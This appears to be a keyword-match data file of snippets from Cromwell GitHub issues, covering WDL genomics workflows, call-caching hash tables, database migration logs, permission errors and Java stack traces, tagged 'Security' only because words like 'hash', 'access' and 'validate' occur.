8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642:267,validat,validate,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1837#issuecomment-271704642,2,['validat'],['validate']
Security,"0000 \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File unmapped_bam = \""${revert_bam_name}\""\n }\n}\n\ntask SortSam {\n File input_bam\n String sorted_bam_name\n Int disk_size\n\n # TODO: why not use samtools sort as it is multi-threaded?\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n SortSam \\\n INPUT=${input_bam} \\\n OUTPUT=${sorted_bam_name} \\\n SORT_ORDER=queryname \\\n MAX_RECORDS_IN_RAM=1000000\n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File sorted_bam = \""${sorted_bam_name}\""\n }\n}\n\ntask ValidateSamFile {\n File input_bam\n String report_filename\n Int disk_size\n\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n ValidateSamFile \\\n INPUT=${input_bam} \\\n OUTPUT=${report_filename} \\\n MODE=VERBOSE \\\n IS_BISULFITE_SEQUENCED=false \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File report = \""${report_filename}\""\n }\n}\n\nworkflow BamToUnmappedBams {\n File input_bam\n String dir_pattern = \""gs://.*/\""\n #String dir_pattern = \""/.*/\""\n Int revert_sam_disk_size = 400\n Int sort_sam_disk_size = 400\n Int validate_sam_file_disk_size = 200\n\n call RevertSam {\n input:\n input_bam = input_bam,\n revert_bam_name = sub(sub(input_bam, dir_pattern, \""\""), \"".bam$\"", \""\"") + \"".unmapped.bam\"",\n disk_size = revert_sam_disk_size\n }\n\n# call SortSam {\n# input:\n# input_bam = RevertSam.unmapped_bam,\n# sorted_bam_name = sub(sub(RevertSam.unmapped_bam, dir_pattern, \""\""), \"".bam$\"", \""\"") + \"".sorted.bam\"",\n# disk_size = sort_sam_disk_size\n# }\n\n call ValidateSamFile {\n input:\n input_bam = RevertSam.unmapped_bam,\n report_filename = sub(sub(RevertSam.unmapped_ba",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1886:2155,Validat,ValidateSamFile,2155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1886,1,['Validat'],['ValidateSamFile']
Security,"000m -jar /usr/gitc/picard.jar \\\n RevertSam \\\n INPUT=${input_bam} \\\n OUTPUT=${revert_bam_name} \\\n VALIDATION_STRINGENCY=LENIENT \\\n ATTRIBUTE_TO_CLEAR=FT \\\n ATTRIBUTE_TO_CLEAR=XS \\\n SORT_ORDER=queryname \\\n MAX_RECORDS_IN_RAM=1000000 \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File unmapped_bam = \""${revert_bam_name}\""\n }\n}\n\ntask SortSam {\n File input_bam\n String sorted_bam_name\n Int disk_size\n\n # TODO: why not use samtools sort as it is multi-threaded?\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n SortSam \\\n INPUT=${input_bam} \\\n OUTPUT=${sorted_bam_name} \\\n SORT_ORDER=queryname \\\n MAX_RECORDS_IN_RAM=1000000\n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File sorted_bam = \""${sorted_bam_name}\""\n }\n}\n\ntask ValidateSamFile {\n File input_bam\n String report_filename\n Int disk_size\n\n command {\n java -Xmx3000m -jar /usr/gitc/picard.jar \\\n ValidateSamFile \\\n INPUT=${input_bam} \\\n OUTPUT=${report_filename} \\\n MODE=VERBOSE \\\n IS_BISULFITE_SEQUENCED=false \n }\n runtime {\n docker: \""broadinstitute/genomes-in-the-cloud:2.2.3-1469027018\""\n disks: \""local-disk \"" + disk_size + \"" HDD\""\n memory: \""3500 MB\""\n }\n output {\n File report = \""${report_filename}\""\n }\n}\n\nworkflow BamToUnmappedBams {\n File input_bam\n String dir_pattern = \""gs://.*/\""\n #String dir_pattern = \""/.*/\""\n Int revert_sam_disk_size = 400\n Int sort_sam_disk_size = 400\n Int validate_sam_file_disk_size = 200\n\n call RevertSam {\n input:\n input_bam = input_bam,\n revert_bam_name = sub(sub(input_bam, dir_pattern, \""\""), \"".bam$\"", \""\"") + \"".unmapped.bam\"",\n disk_size = revert_sam_disk_size\n }\n\n# call SortSam {\n# input:\n# input_bam = RevertSam.unmapped_bam,\n# sorted_bam_name = sub(sub",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1886:2017,Validat,ValidateSamFile,2017,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1886,1,['Validat'],['ValidateSamFile']
Security,"010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fast",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:5306,hash,hashes,5306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"018-06-07 12:16:10,556 INFO - changelog.xml: changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet: Null constraint has been added to WORKFLOW_EXECUTION_AUX.WORKFLOW_OPTIONS; 2018-06-07 12:16:10,556 INFO - changelog.xml: changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet: ChangeSet changesets/workflow_execution_aux_not_null.xml::workflow_execution_aux_not_null::tjeandet ran successfully in 2ms; 2018-06-07 12:16:10,561 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Columns ALLOWS_RESULT_REUSE(BOOLEAN),DOCKER_IMAGE_HASH(VARCHAR(100)),RESULTS_CLONED_FROM(INT),EXECUTION_HASH(VARCHAR(100)) added to EXECUTION; 2018-06-07 12:16:10,562 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Index HASH_INDEX created; 2018-06-07 12:16:10,563 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Columns HASH(VARCHAR(100)) added to SYMBOL; 2018-06-07 12:16:10,564 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: Foreign key constraint added to EXECUTION (RESULTS_CLONED_FROM); 2018-06-07 12:16:10,564 INFO - changelog.xml: changesets/call_result_caching.xml::call_result_caching::chrisl: ChangeSet changesets/call_result_caching.xml::call_result_caching::chrisl ran successfully in 5ms; 2018-06-07 12:16:10,569 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Table EXECUTION_EVENT created; 2018-06-07 12:16:10,570 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Foreign key constraint added to EXECUTION_EVENT (EXECUTION_ID); 2018-06-07 12:16:10,571 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Unique constraint added to EXECUTION_EVENT(EXECUTION_ID, DESCRIPTION); 2018-06-07 12:16:10,571 INFO - changelog.xml: changesets/events_table.xml::execution_event_table::chrisl: Change",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:15516,HASH,HASH,15516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['HASH'],['HASH']
Security,0] [info] WorkflowManagerActor WorkflowActor-8fa7a9e4-f30d-4c19-b8cb-68be6442f317 is in a terminal state: WorkflowFailedState. ```. Looking at the cloudwatch logs it appears that the problem is with permission on the node. ```; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/bucket/cwl_temp_file_8fa7a9e4-f30d-4c19-b8cb-68be6442f317.cwl': Permission denied; ; 04:26:11; chmod: cannot access '': No such file or directory; ; 04:26:11; mkfifo: cannot create fifo '/out.1': Permission denied; ; 04:26:11; mkfifo: cannot create fifo '/err.1': Permission denied; ; 04:26:11; /bin/bash: line 15: /out.1: No such file or directory; ; 04:26:11; /bin/bash: line 16: /err.1: No such file or directory; ; 04:26:11; /bin/bash: line 22: /out.1: Permission denied; ; 04:26:11; /bin/bash: line 23: /cromwell_root/bbmap-rc.txt.tmp: Permission denied; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa': Permission denied; ; 04:26:11; /bin/bash: line 38: /cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*R?.fq.gz': No such file or directory; ; 04:26:11; /bin/bash: line 44: /cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-2e18d4d3f934d19c17412db2b66b70fa': No such file or directory; ; 04:26:11; mkdir: cannot create directory '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': Permission denied; ; 04:26:11; /bin/bash: line 52: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8/cromwell_glob_control_file: No such file or directory; ; 04:26:11; ln: failed to access '/cromwell_root/*.qcstats': No such file or directory; ; 04:26:11; /bin/bash: line 58: /cromwell_root/glob-560912e697c3494360223c7ca65aa3e8.list: Permission denied; ; 04:26:11; ls: cannot access '/cromwell_root/glob-560912e697c3494360223c7ca65aa3e8': No such file or director,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4542:5183,access,access,5183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4542,1,['access'],['access']
Security,0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.A,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8445,secur,security,8445,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"0e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R2Fastq|""9f1cf8859a902eb75202a5c048cd43aa-388""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:File R1Fastq|""62396abd6b589747ee16034888c9a0b5-381""|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input count|9BF31C7FF062936A96D3C8BD1F8F2FF3|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:command template|7BCEDB02C5FC300FF83F07417B49229E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:backend name|2267EF43AEF6BB551F414FEC2390F68A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:effectiveCallCachingMode|ReadAndWriteCache|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:effectiveCallCachingMode|ReadAndWriteCa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:6286,hash,hashes,6286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,0e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String runtime_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCach,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:3824,hash,hashes,3824,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"1-minute description of this: VariableReference had to become aware of where it was, because `p.left` might need a `Pair` called `p`'s `""left""` field, or it might need a `task` called `p`'s `""left""` output, depending on its scope, and the variable reference is different in each case (`p` and `p.left` respectively). Determining whether a reference is a member access or a task output reference is a bit inefficient right now, but I think it should be ok since it's only called during WDL instantiation (thereafter it's all just following the links in WOM objects)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2947:361,access,access,361,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2947,1,['access'],['access']
Security,"1. Find a scientific workflow and run it manually a couple of times to confirm that it is successfully caching as expected (write to cache set to true for all these runs).; 2. Try to invalidate some cache hits (by deleting certain outputs).; 3. Re-run the workflow and confirm that it's not using the invalidated cache hits and using alternate cache hits instead.; 4. Re-run with using floating tags vs hashing and confirm expected behavior.; ; AC: Try the alterations above and others that seem relevant. Keep logs of the workflow attempts or metadata, something to journal this testing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1986:403,hash,hashing,403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1986,1,['hash'],['hashing']
Security,"1. JMUI features! (Bec); 2. Keys and Directories in WDL. Possibly the After keyword as well.(Chris!); 3. Womtool as a service, /describe endpoint (Adam); 4. PAPI v2 Boot Disk Auto-sizing--WDL & CWL (Jeff?); 5. Call Caching Names for Backends (Miguel); 6. Size and File Hash for DRS files (Saloni); 7. Progress on Horizontal Cromwell (Khalid & Miguel?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4480#issuecomment-445969081:269,Hash,Hash,269,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4480#issuecomment-445969081,1,['Hash'],['Hash']
Security,1.0: allow *file-expecting* function calls to work against index access expressions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3660:65,access,access,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3660,1,['access'],['access']
Security,107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); 	at cromwell.backend.impl.aws.AwsBatchAsyncBac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6701,validat,validatedRuntimeAttributes,6701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validatedRuntimeAttributes']
Security,16]: at sun.nio.ch.FileChannelImpl.read(FileChannelImpl.java:159); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:65); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); Mar 09 00:55:25 web start-cromwell.sh[110916]: at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:794); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileH,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:2135,Hash,HashFileStrategy,2135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['Hash'],['HashFileStrategy']
Security,"19-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""Mai",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2157,access,access,2157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
